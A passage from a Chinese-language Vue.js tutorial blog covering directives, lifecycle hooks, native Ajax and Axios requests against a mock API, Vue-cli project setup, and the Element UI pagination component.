<td>v-else-if</td>
<td></td>
</tr>
<tr>
<td>v-show</td>
<td>根据条件展示某元素，区别在于切换的是display属性的值</td>
</tr>
<tr>
<td>v-for</td>
<td>列表渲染，遍历容器的元素或者对象的属性</td>
</tr>
</tbody></table>
<h4 id="①v-bind"><a href="#①v-bind" class="headerlink" title="①v-bind:"></a>①v-bind:</h4><p>为HTML标签绑定属性值，如设置  href , css样式等。当vue对象中的数据模型发生变化时，标签的属性值会随之发生变化。</p>
<h4 id="②v-model："><a href="#②v-model：" class="headerlink" title="②v-model："></a>②v-model：</h4><p>在表单元素上创建双向数据绑定。什么是双向？</p>
<ul>
<li>vue对象的data属性中的数据变化，视图展示会一起变化</li>
<li>视图数据发生变化，vue对象的data属性中的数据也会随着变化。</li>
</ul>
<p>data属性中数据变化，我们知道可以通过赋值来改变，但是视图数据为什么会发生变化呢？<strong>只有表单项标签！所以双向绑定一定是使用在表单项标签上的</strong>。</p>
<p>接下来我们学习一下v-on指令。</p>
<h4 id="③v-on"><a href="#③v-on" class="headerlink" title="③v-on:"></a>③v-on:</h4><p>用来给html标签绑定事件的。<strong>需要注意的是如下2点</strong>：</p>
<ul>
<li><p>v-on语法给标签的事件绑定的函数，必须是vue对象种声明的函数</p>
</li>
<li><p>v-on语法绑定事件时，事件名相比较js中的事件名，没有on</p>
<p>例如：在js中，事件绑定demo函数</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onclick</span>=<span class="string">&quot;demo()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>vue中，事件绑定demo函数</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">v-on:click</span>=<span class="string">&quot;demo()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="④v-if和v-show"><a href="#④v-if和v-show" class="headerlink" title="④v-if和v-show"></a>④v-if和v-show</h4><p>用于觉得是否展示</p>
<p>可以发现，浏览器呈现的效果是一样的，但是浏览器中html源码不一样。v-if指令，不满足条件的标签代码直接没了，而v-show指令中，不满足条件的代码依然存在，只是添加了css样式来控制标签不去显示。</p>
<h4 id="⑤v-for"><a href="#⑤v-for" class="headerlink" title="⑤v-for"></a>⑤v-for</h4><p>v-for: 从名字我们就能看出，这个指令是用来遍历的。其语法格式如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">标签</span> <span class="attr">v-for</span>=<span class="string">&quot;变量名 in 集合模型数据&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123;变量名&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">标签</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>需要注意的是：需要循环那个标签，v-for 指令就写在那个标签上。</p>
<p>有时我们遍历时需要使用索引，那么v-for指令遍历的语法格式如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">标签</span> <span class="attr">v-for</span>=<span class="string">&quot;(变量名,索引变量) in 集合模型数据&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--索引变量是从0开始，所以要表示序号的话，需要手动的加1--&gt;</span></span><br><span class="line">   &#123;&#123;索引变量 + 1&#125;&#125; &#123;&#123;变量名&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">标签</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3、生命周期"><a href="#3、生命周期" class="headerlink" title="3、生命周期"></a>3、生命周期</h3><p>vue的生命周期：指的是vue对象从创建到销毁的过程。vue的生命周期包含8个阶段：每触发一个生命周期事件，会自动执行一个生命周期方法，这些生命周期方法也被称为钩子方法。其完整的生命周期如下图所示：</p>
<table>
<thead>
<tr>
<th>状态</th>
<th>阶段周期</th>
</tr>
</thead>
<tbody><tr>
<td>beforeCreate</td>
<td>创建前</td>
</tr>
<tr>
<td>created</td>
<td>创建后</td>
</tr>
<tr>
<td>beforeMount</td>
<td>挂载前</td>
</tr>
<tr>
<td>mounted</td>
<td>挂载完成</td>
</tr>
<tr>
<td>beforeUpdate</td>
<td>更新前</td>
</tr>
<tr>
<td>updated</td>
<td>更新后</td>
</tr>
<tr>
<td>beforeDestroy</td>
<td>销毁前</td>
</tr>
<tr>
<td>destroyed</td>
<td>销毁后</td>
</tr>
</tbody></table>
<p>下图是 Vue 官网提供的从创建 Vue 到效果 Vue 对象的整个过程及各个阶段对应的钩子函数：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/d3dd27cb2a5d10c6de0c00f4c9cf12fd--9b10--image-20231121195747907.png" alt="image-20231121195747907"></p>
<p>其中我们需要重点关注的是**mounted,**其他的我们了解即可。</p>
<p>mounted：挂载完成，Vue初始化成功，HTML页面渲染成功。<strong>以后我们一般用于页面初始化自动的ajax请求后台数据</strong></p>
<h2 id="5、Ajax的使用"><a href="#5、Ajax的使用" class="headerlink" title="5、Ajax的使用"></a>5、Ajax的使用</h2><h3 id="1、Ajax的介绍"><a href="#1、Ajax的介绍" class="headerlink" title="1、Ajax的介绍"></a>1、Ajax的介绍</h3><p>我们详细的解释一下Ajax技术的2个作用</p>
<ul>
<li><p>与服务器进行数据交互</p>
<p>如下图所示前端资源被浏览器解析，但是前端页面上缺少数据，前端可以通过Ajax技术，向后台服务器发起请求，后台服务器接受到前端的请求，从数据库中获取前端需要的资源，然后响应给前端，前端在通过我们学习的vue技术，可以将数据展示到页面上，这样用户就能看到完整的页面了。此处可以对比JavaSE中的网络编程技术来理解。</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/1478bd2c5b10db3902848da91ea311f7--5dc6--image-20231125221238816.png" alt="image-20231125221238816"></p>
<p>异步交互：可以在<strong>不重新加载整个页面</strong>的情况下，与服务器交换数据并<strong>更新部分网页</strong>的技术。</p>
<p>如下图所示，当我们再百度搜索java时，下面的联想数据是通过Ajax请求从后台服务器得到的，在整个过程中，我们的Ajax请求不会导致整个百度页面的重新加载，并且只针对搜索栏这局部模块的数据进行了数据的更新，不会对整个页面的其他地方进行数据的更新，这样就大大提升了页面的加载速度，用户体验高。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/9c8182429cd46012b107552c0eaa8f90--794e--image-20231125221257133.png" alt="image-20231125221257133"></p>
<p>这里也就再来讲下异步操作和同步操作的区别是什么。</p>
<p>同步请求发送过程如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/3eee530c76cba726b219ea41081ef642--233d--image-20231125221354077.png" alt="image-20231125221354077"></p>
<ul>
<li><p>浏览器页面在发送请求给服务器，在服务器处理请求的过程中，浏览器页面不能做其他的操作。只能等到服务器响应结束后才能，浏览器页面才能继续做其他的操作。 </p>
</li>
<li><p>异步请求发送过程如下图所示：</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/c577c087270747d00d18b684c2ebcca0--5447--image-20231125221404817.png" alt="image-20231125221404817"></p>
<ul>
<li>浏览器页面发送请求给服务器，在服务器处理请求的过程中，浏览器页面还可以做其他的操作。</li>
</ul>
<p>这样就能像百度搜索那样，未点击搜索但是仍然可以显示部分数据。</p>
<h3 id="2、Ajax的简单使用"><a href="#2、Ajax的简单使用" class="headerlink" title="2、Ajax的简单使用"></a>2、Ajax的简单使用</h3><ul>
<li><p>服务器端</p>
<p>因为我们暂时还没学过服务器端的代码，所以此处已经直接提供好了服务器端的请求地址，我们前端直接通过Ajax请求访问该地址即可。<strong>后台服务器地址</strong>：<a href="http://yapi.smart-xwork.cn/mock/169327/emp/list">http://yapi.smart-xwork.cn/mock/169327/emp/list</a></p>
<p>上述地址我们也可以直接通过浏览器来访问，访问结果如图所示：只截取部分数据</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/e3c78a9e3285d3b9c77530b3800ca1d1--4d72--image-20231125222034015.png" alt="image-20231125222034015"></p>
</li>
<li><p>客户端</p>
<p>客户端的Ajax请求代码如下有如下4步，接下来我们跟着步骤一起操作一下。</p>
<p>第一步：首先我们再VS Code中创建AJAX的文件夹，并且创建名为01. Ajax-原生方式.html的文件，提供如下代码，主要是按钮绑定单击事件，我们希望点击按钮，来发送ajax请求</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>原生Ajax<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;获取数据&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;getData()&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">getData</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">     </span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>第二步：创建XMLHttpRequest对象，用于和服务器交换数据，也是原生Ajax请求的核心对象，提供了各种方法。代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1. 创建XMLHttpRequest </span></span><br><span class="line"><span class="keyword">var</span> xmlHttpRequest  = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br></pre></td></tr></table></figure>

<p>第三步：调用对象的open()方法设置请求的参数信息，例如请求地址，请求方式。然后调用send()方法向服务器发送请求，代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//2. 发送异步请求</span></span><br><span class="line">xmlHttpRequest.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;http://yapi.smart-xwork.cn/mock/169327/emp/list&#x27;</span>);</span><br><span class="line">xmlHttpRequest.<span class="title function_">send</span>();<span class="comment">//发送请求</span></span><br></pre></td></tr></table></figure>

<p>第四步：我们通过绑定事件的方式，来获取服务器响应的数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//3. 获取服务响应数据</span></span><br><span class="line">xmlHttpRequest.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//此处判断 4表示浏览器已经完全接受到Ajax请求得到的响应， 200表示这是一个正确的Http请求，没有错误</span></span><br><span class="line">    <span class="keyword">if</span>(xmlHttpRequest.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; xmlHttpRequest.<span class="property">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;div1&#x27;</span>).<span class="property">innerHTML</span> = xmlHttpRequest.<span class="property">responseText</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>最后我们通过浏览器打开页面，请求点击按钮，发送Ajax请求，最终显示结果如下图所示：</p>
<p> <img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/199862e599fc5422f4a52ec17821161c--1f36--image-20231125222026868.png" alt="image-20231125222026868"></p>
<p>并且通过浏览器的f12抓包，我们点击网络中的XHR请求，发现可以抓包到我们发送的Ajax请求。XHR代表的就是异步请求</p>
</li>
</ul>
<p>这些代码看起来也就是很复杂吧，很不方便去记忆，这个时候，Axios就因此诞生了。</p>
<h3 id="3、Axios"><a href="#3、Axios" class="headerlink" title="3、Axios"></a>3、Axios</h3><p>Axios的使用比较简单，主要分为2步：</p>
<ul>
<li><p>引入Axios文件</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/axios-0.18.0.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用Axios发送请求，并获取响应结果，官方提供的api很多，此处给出2种，如下</p>
<ul>
<li><p>发送 get 请求</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line">    <span class="attr">method</span>:<span class="string">&quot;get&quot;</span>,</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&quot;http://localhost:8080/ajax-demo1/aJAXDemo1?username=zhangsan&quot;</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">resp</span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(resp.<span class="property">data</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>发送 post 请求</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line">    <span class="attr">method</span>:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&quot;http://localhost:8080/ajax-demo1/aJAXDemo1&quot;</span>,</span><br><span class="line">    <span class="attr">data</span>:<span class="string">&quot;username=zhangsan&quot;</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">resp</span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(resp.<span class="property">data</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li>
</ul>
<p>axios()是用来发送异步请求的，小括号中使用 js的JSON对象传递请求相关的参数：</p>
<ul>
<li>method属性：用来设置请求方式的。取值为 get 或者 post。</li>
<li>url属性：用来书写请求的资源路径。如果是 get 请求，需要将请求参数拼接到路径的后面，格式为： url?参数名&#x3D;参数值&amp;参数名2&#x3D;参数值2。</li>
<li>data属性：作为请求体被发送的数据。也就是说如果是 post 请求的话，数据需要作为 data 属性的值。</li>
</ul>
<p>then() 需要传递一个匿名函数。我们将 then()中传递的匿名函数称为 <strong>回调函数</strong>，意思是该匿名函数在发送请求时不会被调用，而是在成功响应后调用的函数。而该回调函数中的 resp 参数是对响应的数据进行封装的对象，通过 resp.data 可以获取到响应的数据。</p>
</li>
</ul>
<p>Axios还针对不同的请求，提供了别名方式的api,具体如下：</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>axios.get(url [, config])</td>
<td>发送get请求</td>
</tr>
<tr>
<td>axios.delete(url [, config])</td>
<td>发送delete请求</td>
</tr>
<tr>
<td>axios.post(url [, data[, config]])</td>
<td>发送post请求</td>
</tr>
<tr>
<td>axios.put(url [, data[, config]])</td>
<td>发送put请求</td>
</tr>
</tbody></table>
<p>我们目前只关注get和post请求，所以在上述的入门案例中，我们可以将get请求代码改写成如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">axios.<span class="title function_">get</span>(<span class="string">&quot;http://yapi.smart-xwork.cn/mock/169327/emp/list&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result.<span class="property">data</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>post请求改写成如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">axios.<span class="title function_">post</span>(<span class="string">&quot;http://yapi.smart-xwork.cn/mock/169327/emp/deleteById&quot;</span>,<span class="string">&quot;id=1&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result.<span class="property">data</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="6、Vue的简单教程介绍"><a href="#6、Vue的简单教程介绍" class="headerlink" title="6、Vue的简单教程介绍"></a>6、Vue的简单教程介绍</h2><h3 id="1、项目创建"><a href="#1、项目创建" class="headerlink" title="1、项目创建"></a>1、项目创建</h3><p>环境准备好了，接下来我们需要通过Vue-cli创建一个vue项目，然后再学习一下vue项目的目录结构。Vue-cli提供了如下2种方式创建vue项目:</p>
<ul>
<li><p>命令行：直接通过命令行方式创建vue项目</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vue create vue-project01</span><br></pre></td></tr></table></figure>


</li>
<li><p>图形化界面：通过命令先进入到图形化界面，然后再进行vue工程的创建</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vue ui</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2、项目结构的简单分析"><a href="#2、项目结构的简单分析" class="headerlink" title="2、项目结构的简单分析"></a>2、项目结构的简单分析</h3><p>我们通过VS Code打开之前创建的vue文件夹，打开之后，呈现如下图所示页面：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/a84df0d25fc9623cd84a8136751af782--7c96--image-20231125224706489.png" alt="image-20231125224706489"></p>
<p>vue项目的标准目录结构以及目录对应的解释如下图所示:</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/5cc1aec4f35e31988a0864b2586a0c5e--5409--image-20231125224714378.png" alt="image-20231125224714378"></p>
<p>其中我们平时开发代码就是在<strong>src目录</strong>下	</p>
<h3 id="3、Vue项目的运行"><a href="#3、Vue项目的运行" class="headerlink" title="3、Vue项目的运行"></a>3、Vue项目的运行</h3><p>那么vue项目开发好了，我们应该怎么运行vue项目呢？主要提供了2种方式</p>
<ul>
<li>第一种方式：通过VS Code提供的图形化界面 ，如下图所示：（注意：NPM脚本窗口默认不显示，可以参考本节的最后调试出来）</li>
</ul>
<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/c06bda53d80150fc54aea584a377c7d0--c078--image-20231125225846123.png" alt="image-20231125225846123"></p>
<p>点击之后，我们等待片刻，即可运行，在终端界面中，我们发现项目是运行在本地服务的8080端口，我们直接通过浏览器打开地址</p>
<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/f1f262284f1a4dd41228e35f1ecf52e8--3933--image-20231125225858533.png" alt="image-20231125225858533"></p>
<p>最终浏览器打开后，呈现如下界面，表示项目运行成功</p>
<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/c7ec1f87086087633a3fc5e245fdc31a--d81e--image-20231125225912576.png" alt="image-20231125225912576"></p>
<p>其实此时访问的是 <strong>src&#x2F;App.vue</strong>这个根组件，此时我们打开这个组件，修改代码：添加内容Vue</p>
<p>只要我们保存更新的代码，我们直接打开浏览器，不需要做任何刷新，发现页面呈现内容发生了变化，如下图所示：</p>
<p>这就是我们vue项目的热更新功能 </p>
<p>对于8080端口，经常被占用，所以我们可以去修改默认的8080端口。我们修改vue.config.js文件的内容，添加如下代码：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">devServer<span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    port<span class="punctuation">:</span><span class="number">7000</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>第二种方式：命令行方式</p>
<p>直接基于cmd命令窗口，在vue目录下，执行输入命令<code>npm run serve</code>即可，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/65f26040c8e0cf8668a0e615a8a223ea--ef9c--image-20231125230802565.png" alt="image-20231125230802565"></p>
<h3 id="4、Vue组件库Element"><a href="#4、Vue组件库Element" class="headerlink" title="4、Vue组件库Element"></a>4、Vue组件库Element</h3><h4 id="1、简单介绍"><a href="#1、简单介绍" class="headerlink" title="1、简单介绍"></a>1、简单介绍</h4><p>不知道同学们还否记得我们之前讲解的前端开发模式MVVM，我们之前学习的vue是侧重于VM开发的，主要用于数据绑定到视图的，那么接下来我们学习的ElementUI就是一款侧重于V开发的前端框架，主要用于开发美观的页面的。</p>
<p>Element：是饿了么公司前端开发团队提供的一套基于 Vue 的网站组件库，用于快速构建网页。</p>
<p>Element 提供了很多组件（组成网页的部件）供我们使用。例如 超链接、按钮、图片、表格等等。如下图所示就是我们开发的页面和ElementUI提供的效果对比：可以发现ElementUI提供的各式各样好看的按钮</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-26/c92b1497ee7ee1c09646c7aaebee97d7--60f3--image-20231126124900304.png" alt="image-20231126124900304"></p>
<p>ElementUI的学习方式和我们之前的学习方式不太一样，对于ElementUI，我们作为一个后台开发者，只需要<strong>学会如何从ElementUI的官网拷贝组件到我们自己的页面中，并且做一些修改即可</strong>。其官网地址：<a href="https://element.eleme.cn/#/zh-CN%EF%BC%8C%E6%88%91%E4%BB%AC%E4%B8%BB%E8%A6%81%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%98%AFElementUI%E4%B8%AD%E6%8F%90%E4%BE%9B%E7%9A%84%E5%B8%B8%E7%94%A8%E7%BB%84%E4%BB%B6%EF%BC%8C%E8%87%B3%E4%BA%8E%E5%85%B6%E4%BB%96%E7%BB%84%E4%BB%B6%E5%90%8C%E5%AD%A6%E4%BB%AC%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E6%88%91%E4%BB%AC%E8%BF%99%E5%87%A0%E4%B8%AA%E7%BB%84%E4%BB%B6%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%8E%8C%E6%8F%A1%E5%88%B0ElementUI%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%8A%80%E5%B7%A7%EF%BC%8C%E7%84%B6%E5%90%8E%E8%AF%BE%E5%90%8E%E8%87%AA%E8%A1%8C%E5%AD%A6%E4%B9%A0%E3%80%82">https://element.eleme.cn/#/zh-CN，我们主要学习的是ElementUI中提供的常用组件，至于其他组件同学们可以通过我们这几个组件的学习掌握到ElementUI的学习技巧，然后课后自行学习。</a></p>
<h4 id="2、快速入门"><a href="#2、快速入门" class="headerlink" title="2、快速入门"></a>2、快速入门</h4><p>首先我们要掌握ElementUI的快速入门，接下来同学们就一起跟着步骤来操作一下。</p>
<p>首先，我们先要安装ElementUI的组件库，打开VS Code，停止之前的项目，然后在命令行输入如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install element-ui@2.15.3 </span><br></pre></td></tr></table></figure>

<p>然后我们需要在main.js这个入口js文件中引入ElementUI的组件库，其代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">ElementUI</span> <span class="keyword">from</span> <span class="string">&#x27;element-ui&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;element-ui/lib/theme-chalk/index.css&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">ElementUI</span>);</span><br></pre></td></tr></table></figure>

<p>然后我们需要按照vue项目的开发规范，在<strong>src&#x2F;views</strong>目录下创建一个vue组件文件，注意组件名称后缀是.vue，并且在组件文件中编写之前介绍过的基本组件语法，代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>PS:Element组件的所有属性都可以在组件页面的最下方找到</strong>，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-26/0f0b2aab93e8d8518b669d973dde38c1--6d6a--image-20231126131145410.png" alt="image-20231126131145410"></p>
<h4 id="3、分页组件的使用"><a href="#3、分页组件的使用" class="headerlink" title="3、分页组件的使用"></a>3、分页组件的使用</h4><h5 id="①模块的简单使用介绍"><a href="#①模块的简单使用介绍" class="headerlink" title="①模块的简单使用介绍"></a>①模块的简单使用介绍</h5><p>Pagination: 分页组件，主要提供分页工具条相关功能。其展示效果图下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-26/7468d1d99b01cb7723ca4c0cd4335452--94ad--image-20231126131705631.png" alt="image-20231126131705631"></p>
<p>首先在官网找到分页组件，我们选择带背景色分页组件，如下图所示：</p>
<p>然后复制代码到我们的ElementView.vue组件文件的template中，拷贝如下代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">el-pagination</span></span></span><br><span class="line"><span class="tag">    <span class="attr">background</span></span></span><br><span class="line"><span class="tag">    <span class="attr">layout</span>=<span class="string">&quot;prev, pager, next&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:total</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">el-pagination</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>对于分页组件我们需要关注的是如下几个重要属性（可以通过查阅官网组件中最下面的组件属性详细说明得到）：</p>
<ul>
<li>background: 添加北京颜色，也就是上图蓝色背景色效果。</li>
<li>layout: 分页工具条的布局，其具体值包含<code>sizes</code>, <code>prev</code>, <code>pager</code>, <code>next</code>, <code>jumper</code>, <code>-&gt;</code>, <code>total</code>, <code>slot</code> 这些值</li>
<li>total: 数据的总数量</li>
</ul>
<p>然后根据官方分页组件提供的layout属性说明，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-26/e22f237cc331a65a0908fb17c9c2b5b6--af07--image-20231126132145510.png" alt="image-20231126132145510"></p>
<p>我们可以进行相关的自定义</p>
<h5 id="②组件事件"><a href="#②组件事件" class="headerlink" title="②组件事件"></a>②组件事件</h5><p>对于分页组件，除了上述几个属性，还有2个非常重要的事件我们需要去学习：</p>
<ul>
<li>size-change ： pageSize 改变时会触发 </li>
<li>current-change ：currentPage 改变时会触发</li>
</ul>
<p>其官方详细解释含义如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-26/e827629131f4a621175ebf09cc745931--039d--image-20231126132222798.png" alt="image-20231126132222798"></p>
<p>然后我们找到对应的代码，首先复制事件，复制代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">@size-change=<span class="string">&quot;handleSizeChange&quot;</span></span><br><span class="line">@current-change=<span class="string">&quot;handleCurrentChange&quot;</span></span><br></pre></td></tr></table></figure>

<p>此时Panigation组件的template完整代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Pagination分页 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">el-pagination</span></span></span><br><span class="line"><span class="tag">               @<span class="attr">size-change</span>=<span class="string">&quot;handleSizeChange&quot;</span></span></span><br><span class="line"><span class="tag">               @<span class="attr">current-change</span>=<span class="string">&quot;handleCurrentChange&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">background</span></span></span><br><span class="line"><span class="tag">               <span class="attr">layout</span>=<span class="string">&quot;sizes,prev, pager, next,jumper,total&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">:total</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">el-pagination</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>紧接着需要复制事件需要的2个函数，需要注意methods属性和data同级，其代码如下：</p>
